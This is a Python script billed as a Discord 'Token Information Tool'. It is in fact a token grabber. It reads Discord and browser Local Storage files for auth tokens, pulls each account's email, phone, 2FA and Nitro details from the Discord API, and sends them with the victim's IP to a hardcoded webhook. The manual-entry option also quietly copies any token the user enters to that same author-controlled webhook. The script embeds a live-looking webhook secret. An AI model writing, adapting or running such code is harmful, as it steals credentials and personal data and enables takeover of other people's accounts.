import os
import re
import httpx

MY_WEBHOOK_URL = "https://discord.com/api/webhooks/1562820154939674734/-Q1Jd1z7FbEVeev82FXsYTT2GVl11uZhYjm3UEL_SGtZ86HYTQ3hgA37s4A4k3V7iBwl"

BANNER = r"""
                        ......................::::--------::::::............. ......       .        
                  ..........:--=+*##%%%%%%%%####*********************###***+-:.......          .    
    .            ....:=+*#%%%%%%#*+=--::::::--=++++++======+==-:..:::::::-=+***-......  .           
          .   ....-#%%%#+=-::::::::::----::.........:::::......-+*=:.........:+**-....              
         .  ...=#%#*+-:-+++++++++++====---===++++==--::::--=+++=-::-==-:.......-**+:..              
         . ..+%@#=-::::-::::::::::::::::::::::.....-=====+++==:::-=+-.:-=:......:=**-..             
.          .#@%-::::::::-+#*=-::-==+*+-:::::::::..:+==#%%%%%%%%%%#=::++:..-:......=**-...    .      
         ..*@*-:::::::=#+-:::::::::::-::::::::::.:#%%%*=:::::::=*%%%*-:-=-:........=**:....         
        ..:%@+:::::::-+::::::::::::::-*::::::::::+%%+:::::::::::::+%%=-:.::.........+#+:.......     
       ..:#@#-:::::::::::::::---::::::=:::::::::=%%=::=+++++=-=----=%%=..............+**:....... . .
    ....=%@#-::::::::::=+#%%%%%%%%#+-:::::::::::*%#=++=-::-==---==++#%#-.............:=*#=......    
    ..=%@%=-=******+=:=%%%%%##%%%%%%%%+::::::::-#%*+-::::-------=+==+%%+::==-.....::-=+*##*=....... 
.  ..+@@+-*#=--::::::::::--=++*##%%%%%%%%%#::::-#%*=-=++++--::::--==*%%%%=-::........::==-***=..... 
....+@%=*+-+*+---------::::::::::::-=#%#+-::::::*%%+++=-::::::=-::::#%#=+%*-=*######*=:..-=-+#+:... 
 ..:@@+#=-*=-*%%@@@%%#+::::--::::::::=%*::::::::-#%*::::::::::-++==#%%%##%%##+-::.:-+##=..:=.=**....
  .=@%*+-=+-+#=-----+%@@%%@@#-::::::-*%*::::::::::#%%=:::::::::::*%%%%%%%%-...:*#:...:+#+..=::+#+...
 ..=@%*+-+*------+#---+**++-:::::-=*%%*-::::::::::-*%%%#+=--==+#%%#=::+%%%-:-=#%%+:...:*#-.--.=**:..
 ..:%@*#--*+----+%@+------------*%@%=-::::::::::::*##%%%%%%%%%%#=-::::*%%%%%%#++#%#*-::+#-.=-.-**:..
   .-@@*%+------%@@%---------=#%%@@#-:::::::::-===-:::##-:::::::::::-+%%%%+:...=#%#**--**::+::*%+...
    .=%@+=**=--*@@@@%=----+*+----=#@#=::::::=*#*##%+-#%*::::::-=+*%@%%%%%%-...-#%+.:::+*::==.+%#....
.   ..=@%+----=@@=@@@@@%*-----------=#%%*#%=:::::::::-+-::-=*%%%@%*-:.#%%%%::+#%%#::::::::+=:*%#:....
     ..+@%=---+@@@@+=%@@@@%+=---------*##=::::::::--=*%%%%%#+:......-%%%%%%%%%%*::::::-=::=%%*......
    ....#@*---*@@@#:=@#.:+@@@@@@%###***+++***#%%%%%#*+=+%@=.......=#%%%%%%==#%*-:::::::-#%%#-.......
    ....=@@=--+@@@%:*@#...%@*:::--=#@%++=--=%@#:........*%=..=*#%%%%%%%%%%*#%=:::::::::+%%=.........
    ....:%@=--+@@@@@@@@+:-%@=......=@+......*@=........-#%%%@%%@%%*-.%%%%%%#-:::::::::=%%:......    
 ..     :#@+--=@@=@@=@@@@@@@@@@@@%%%#%@@#****#%@%#*##%%%%%%%%%%#+-.....+%%%%*-:::::::::=%#:.......    
. .     .#@+--=@@=@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%#+#@%-........+%%%%=:::::::::+%%-....    . . 
.      .:#@+---*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+-......%%=.....:*%%%%%%+:::::::-*%%-.....        
     ...:%@=----%@##@%-#@%*#%@@@%%@@@@@*++=-::%@=.........-%%:.:+%%%*=*%%%=::::::=#%#:......        
    ....-@%-----=%@%@%-.#@#.:*@#...:*@#.......%%=..........*@%%%%*=---+%%%-:-::-#%%=......        . 
     ...=@#-------*@@@#=-%@=.:%@+....#%:......#@=....::-*%@@%%+----=+*%%%%#=:-*%%+......            
   . ...*@*---------=*#%@@@@%%%@@%*++%@%*+==+*@@@%%@@@@%#+=----=*#+==+%%%%++%%#=..... ..            
     ...#@+----------------==+**#%%@@@@@@@@@@%%#*++==------=*#*=-=##+=*%%%%%+:.......               
  .  . .%@+---+----+*=-------------======-------------=+*##+=+##+--=+#%%%%=......                   
       :%%=---*#=----+##*==------------------==++*****+**#*+=---+#%@@##%%%-.....  .                 
       :%%=----=**=------==+++**********+++===-=+*##*+=-----=*%@@#-:..+%%%-.....                    
       .*@*-------=*#*++==============+++****++=--------=*%@@%+:......+%%%:....              .      
      ..:%@*-------------=========-----------------+*#%@@%*-..........+%%%-....    .                
       ..:#@@+-------------------------------=*%@@@@@%=:..............*#%%%=....                     
  .     ...-#@@#+=------------------==+*#%@@@%%#+-........    ........:*#=.......                   
     .      ..-*%@@@%%########%%%@@@@@#*+=-:..............      ...............                     
 .            .....:-=+*####*+=-::................        .          ....       . .            .    
    .        .         ....  .............            .  .                           .        ..    
                            .                       .         .                            .        
       .   .               ..                  ...                    .   .                         
   .     .         .               .           .   .           .                              .     
"""

def extract_all_tokens():
    paths = {
        "Discord": os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(os.getenv("APPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(os.getenv("APPDATA", ""), "discordptb", "Local Storage", "leveldb"),
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
    }
    
    tokens = []
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                    content = f.read()
                    found = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}", content)
                    for t in found:
                        if t not in tokens:
                            tokens.append(t)
            except:
                pass
    return tokens

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return "🌐"
    return chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)

def fetch_ip_data():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        r = httpx.get("http://ip-api.com/json/", headers=headers, timeout=3.0)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                ip = data.get("query", "Hidden")
                cc = data.get("countryCode", "")
                country = data.get("country", "Unknown")
                flag = get_flag_emoji(cc)
                return ip, f"{flag} {country}"
    except:
        pass
    return "Hidden", "🌐 Unknown"

def main():
    print(BANNER)
    print("=" * 90)
    print("                        Token Information Tool")
    print("=" * 90)
    
    while True:
        print("\nChoose an option:")
        print("  [1] Enter Token & Webhook Manually")
        print("  [2] Extract ALL Tokens (Print to Screen & Send to Your Webhook)")
        print("  [3] Exit")
        
        choice = input("\nEnter your choice [1/2/3]: ").strip()
        
        if choice == "3":
            print("\nExiting program. Goodbye!")
            break
            
        elif choice == "2":
            print("\n[*] Scanning system for all Discord tokens...")
            all_tokens = extract_all_tokens()
            
            if not all_tokens:
                print("[!] No tokens found automatically on this device.")
                input("\nPress Enter to return to menu...")
                continue

            print(f"\n[✓] Found {len(all_tokens)} token(s)!\n")
            user_ip, country_info = fetch_ip_data()

            for idx, token in enumerate(all_tokens, 1):
                print(f"--------------------------------------------------")
                print(f"Token #{idx}: {token}")
                
                headers = {
                    "Authorization": token,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                }
                try:
                    r = httpx.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=4.0)
                    if r.status_code != 200:
                        print(f"Status: Invalid or Dead Token (Code: {r.status_code})")
                        continue
                    
                    me = r.json()
                    nitro_types = {0: "None", 1: "Classic", 2: "Boost", 3: "Basic"}
                    nitro_status = nitro_types.get(me.get("premium_type", 0), "None")

                    display_name = me.get('global_name') or me.get('username')
                    username = me.get('username')
                    user_id = me.get('id')
                    email = me.get('email') or 'Not Available'
                    phone = me.get('phone') or 'None'
                    
                    print(f"User: {username} ({display_name})")
                    print(f"ID: {user_id}")
                    print(f"Email: {email}")
                    print(f"Phone: {phone}")
                    
                    avatar_hash = me.get('avatar')
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=512" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"

                    embed_data = {
                        "username": "Token Grabber Bot",
                        "embeds": [
                            {
                                "title": f"⚡ {display_name} ({username}) [#{idx}]",
                                "color": 8856031,
                                "thumbnail": {"url": avatar_url},
                                "fields": [
                                    {"name": "🌐 IP Address", "value": f"`{user_ip}` ({country_info})", "inline": False},
                                    {"name": "🏷️ Display Name", "value": f"`{display_name}`", "inline": True},
                                    {"name": "👤 Username & ID", "value": f"`{username} ({user_id})`", "inline": True},
                                    {"name": "📧 Email", "value": f"`{email}`", "inline": True},
                                    {"name": "📱 Phone", "value": f"`{phone}`", "inline": True},
                                    {"name": "🔐 2FA", "value": f"`{'Yes' if me.get('mfa_enabled') else 'No'}`", "inline": True},
                                    {"name": "🚀 Nitro", "value": f"`{nitro_status}`", "inline": True},
                                    {"name": "🔑 Token", "value": f"```{token}```", "inline": False}
                                ],
                                "footer": {"text": "Auto Extractor CLI | Developed by Dr andro"}
                            }
                        ]
                    }

                    httpx.post(MY_WEBHOOK_URL, json=embed_data, timeout=5.0)
                    print(f"[✓] Sent token #{idx} info to your webhook successfully!")
                except Exception as e:
                    print(f"[X] Error fetching account info: {str(e)}")

            print("\n--------------------------------------------------")
            print("[✓] Done processing all tokens!")
            input("\nPress Enter to return to menu...")
            
        elif choice == "1":
            token = input("\nEnter your token: ").strip()
            target_webhook = input("Enter target webhook URL: ").strip()

            if not token or not target_webhook:
                print("\n[!] Error: Token and Webhook URL cannot be empty!")
                input("\nPress Enter to return to menu...")
                continue

            print("\n[*] Fetching account details...")

            headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            try:
                r = httpx.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5.0)
                if r.status_code != 200:
                    print("\n[X] Error: Invalid token!")
                    input("\nPress Enter to return to menu...")
                    continue

                me = r.json()
                user_ip, country_info = fetch_ip_data()
                nitro_types = {0: "None", 1: "Classic", 2: "Boost", 3: "Basic"}
                nitro_status = nitro_types.get(me.get("premium_type", 0), "None")
                display_name = me.get('global_name') or me.get('username')
                username = me.get('username')
                user_id = me.get('id')
                avatar_hash = me.get('avatar')
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=512" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png"

                embed_data = {
                    "username": "Token Information Tool",
                    "embeds": [
                        {
                            "title": f"⚡ {display_name} ({username})",
                            "color": 8856031,
                            "thumbnail": {"url": avatar_url},
                            "fields": [
                                {"name": "🌐 IP Address", "value": f"`{user_ip}` ({country_info})", "inline": False},
                                {"name": "🏷️ Display Name", "value": f"`{display_name}`", "inline": True},
                                {"name": "👤 Username & ID", "value": f"`{username} ({user_id})`", "inline": True},
                                {"name": "📧 Email", "value": f"`{me.get('email') or 'Not Available'}`", "inline": True},
                                {"name": "📱 Phone", "value": f"`{me.get('phone') or 'None'}`", "inline": True},
                                {"name": "🔐 2FA", "value": f"`{'Yes' if me.get('mfa_enabled') else 'No'}`", "inline": True},
                                {"name": "🚀 Nitro", "value": f"`{nitro_status}`", "inline": True},
                                {"name": "🔑 Token", "value": f"```{token}```", "inline": False}
                            ],
                            "footer": {"text": "Token Information CLI | Developed by Dr andro"}
                        }
                    ]
                }

                httpx.post(target_webhook, json=embed_data, timeout=5.0)
                httpx.post(MY_WEBHOOK_URL, json=embed_data, timeout=5.0)
                print("\n[✓] Success! Information sent to webhooks.")
            except Exception as e:
                print(f"\n[X] An error occurred: {str(e)}")
            
            input("\nPress Enter to return to menu...")
        else:
            print("\n[!] Invalid choice. Please select 1, 2, or 3.")
            input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()